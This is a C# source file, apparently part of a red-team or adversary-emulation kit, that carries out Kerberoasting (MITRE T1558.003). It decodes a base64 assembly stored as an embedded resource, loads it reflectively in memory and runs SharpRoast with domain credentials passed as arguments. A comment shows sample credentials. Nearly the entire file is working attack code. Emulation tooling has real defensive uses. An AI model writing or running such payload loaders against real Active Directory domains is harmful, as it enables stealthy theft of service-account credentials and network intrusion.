using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;

class Technique
{
	/*
		T1558-003 (Steal or Forge Kerberos Tickets: Kerberoasting).

		first parameter - Distinguished Name - "LDAP://DC=dale,DC=com,DC=br" 
		second parameter - Valid User - "dale.com.br\\junin" 
		third parameter - Valid User's Password - "Il0veJ3zu5"
    */

	public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

	public static bool Inject(byte[] bytes, string[] techniqueParams){
		try{

			var assembly = System.Reflection.Assembly.Load(bytes);
			
			Type t = assembly.GetType("SharpRoast.Program");

			object o = Activator.CreateInstance(t);
			object[] args = new object[] { techniqueParams };
			t.GetMethod("Main").Invoke(o, args);

			Console.WriteLine("Executed technique with success.");
			return true;

		}
		catch (Exception ex){
			Console.WriteLine("Could not execute technique.");

			Console.WriteLine("Error injecting code ({0})", ex.Message, "alert");
		}
		return false;
	}

	public static bool execCommand(string[] args){
		try{
			string converted = Encoding.UTF8.GetString(T1558_003.Properties.Resources.roro, 0, T1558_003.Properties.Resources.roro.Length);

			Inject(Convert.FromBase64String(converted), args);
			return true;
		}catch (Exception){
            throw;
        }
    }

    public static void Main(string[] args)
    {
        Console.WriteLine("[T1558-003] Starting Execution!");
		Console.WriteLine("[T1558-003] Kerberoasting " + args[0] + " domain.");
        if (execCommand(args)){
            Console.WriteLine("[T1558-003] Successfully executed Technique (return 0)! ");
        }
        else{
            Console.WriteLine("[T1558-003] Oops, something went wrong! ");
        }
    }
}